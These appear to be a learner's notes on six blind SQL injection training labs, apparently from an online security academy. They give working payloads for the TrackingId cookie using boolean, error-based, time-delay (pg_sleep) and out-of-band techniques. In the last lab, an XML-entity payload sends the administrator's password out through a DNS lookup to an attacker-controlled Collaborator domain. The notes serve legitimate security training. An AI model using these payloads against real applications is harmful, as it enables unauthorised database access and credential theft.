Lab 1: Blind SQL injection with conditional responses
Injected point: TrackingId
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'a: true
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'z: true
' AND (SELECT 'A' FROM users LIMIT 1)='A: true
' AND (SELECT 'a' FROM users WHERE username='administrator')='a: true
LENGTH(password) = 20 --admin
' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(PASSWORD,§1§,1)='§a§')='a
password= qfw2epxleg50baw4xir6
----------------------------------------------------------------------------------------------------
Lab 2: Blind SQL injection with conditional errors
Injected point: TrackingId
' UNION SELECT '' --: invalid
' UNION SELECT '' FROM DUAL --: valid => Oracle database.
' UNION SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE 'a' END FROM DUAL --: not cause any error => data need to be retrieved is a string.
' UNION SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE 'a' END FROM DUAL --: internal server error => blind sqli with errors vuln.
' UNION SELECT CASE WHEN (username = 'administrator') THEN to_char(1/0) ELSE 'a' END FROM users --: internal server error => user 'administrator' exists in 'users' table.
' UNION SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password,1,1) > '1') THEN to_char(1/0) ELSE 'a' END FROM users -- => can use intruder to attack the password
' UNION SELECT CASE WHEN (username = 'administrator' AND length(password) > §1-->21§) THEN to_char(1/0) ELSE 'a' END FROM users --: "21" value has no error => length of admin's password is 20.
password: vlc27prb10so32bp4fqb
----------------------------------------------------------------------------------------------------------------------------------
Lab 3: Blind SQL injection with time delays
Injected point: TrackingId
'||pg_sleep(10)--: HTTPS Response delays 10 seconds (PostgreSQL)
----------------------------------------------------------------------------------------------------------------------------------
Lab 4: Blind SQL injection with time delays and information retrieval
Injected point: TrackingId
'|| pg_sleep(2)--: HTTPS Response delays 2 seconds => PostgreSQL
'%3BSELECT pg_sleep(7)--: HTTPS Response delays 7 seconds => can use select attacks to retrieve data.
'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--: HTTPS Response delays 7 seconds => can check the condition through time delays.
'%3BSELECT CASE WHEN (table_name='users') THEN pg_sleep(7) ELSE pg_sleep(0) END FROM information_schema.tables--: HTTPS Response delays 7 seconds => table named 'users' existed in database.
'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users--: HTTPS Response delays 7 seconds => username 'administrator' existed.
'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users--: HTTPS Response delays 7 seconds => length of administrator's password is 20.
'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password from 1 for 1)>'') THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users--: HTTPS Response delays 7 seconds => bruteforce for password can work.
password is xsnuxfjwzq5nivlq1tri
----------------------------------------------------------------------------------------------------------------------------------
Lab 5: Blind SQL injection with out-of-band interaction
Injected point: TrackingId
*Set up the Burp Collaborator client, click "Copy the clipboard" to gain your own external domain so that the targeted web server can perform a DNS lookup to your Burp Client.
exec master..xp_dirtree '//[YOUR-SUBDOMAIN-HERE].burpcollaborator.net/a'--: do not work: cookie tampering error => not SQL Server.
'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//[YOUR-SUBDOMAIN-HERE].burpcollaborator.net/">+%25remote%3b]>'),'/a')+FROM+dual--: no error => DNS lookup occurs.
*Poll the Collaborator server to confirm that a DNS lookup occurred.
*Turn off the Burp Suite proxy on browser and refresh to solve the lab.
----------------------------------------------------------------------------------------------------------------------------------
Lab 6: Blind SQL injection with out-of-band data exfiltration
Injected point: TrackingId
*Set up the Burp Collaborator client, click "Copy the clipboard" to gain your own external domain so that the targeted web server can perform a DNS lookup to your Burp Client.
'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//[YOUR-SUBDOMAIN-HERE].burpcollaborator.net/">+%25remote%3b]>'),'/a')+FROM+dual--: no error => DNS lookup occurs.
*Poll the Collaborator server to confirm that a DNS lookup occurred.
'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.[YOUR-SUBDOMAIN-HERE].burpcollaborator.net/">+%25remote%3b]>'),'/abc')+FROM+dual--: no error => DNS lookup occurs.
*Poll the Collaborator server, check the last DNS queries and the domain name send queries to your server, as their generated subdomain will contain administrator's password, e.g. j3232jw46g5yavtrjmp1.quo30k4pqdcne2h9e1mch57bs2ysmh.burpcollaborator.net, whose j3232jw46g5yavtrjmp1 is my gained password.
